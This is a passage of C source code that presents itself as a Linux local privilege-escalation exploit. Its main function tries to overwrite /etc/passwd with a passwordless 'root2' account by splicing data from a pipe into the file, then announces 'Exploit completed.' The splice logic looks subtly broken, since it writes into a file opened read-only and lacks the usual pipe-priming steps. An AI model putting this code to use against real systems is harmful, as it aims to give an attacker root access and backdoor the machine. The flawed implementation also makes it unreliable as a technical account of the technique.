#define PAGE_SIZE 4096
#endif

void write_file(const char *path, const char *data, off_t offset) {
    int f = open(path, O_RDONLY);
    if (f == -1) {
        perror("open");
        exit(1);
    }

    int p[2];
    if (pipe(p) == -1) {
        perror("pipe");
        exit(1);
    }

    // Fill the pipe with data
    write(p[1], data, strlen(data));

    // Splice the pipe to the file at the specified offset
    loff_t off = offset;
    ssize_t n = splice(p[0], NULL, f, &off, strlen(data), SPLICE_F_MOVE | SPLICE_F_NONBLOCK);
    if (n == -1) {
        perror("splice");
        exit(1);
    }

    close(p[0]);
    close(p[1]);
    close(f);
}

int main() {
    // Example: Overwrite /etc/passwd to add a root user
    const char *data = "root2::0:0:root:/root:/bin/bash\n";
    write_file("/etc/passwd", data, 0);

    printf("Exploit completed. Check /etc/passwd for changes.\n");
    return 0;
}
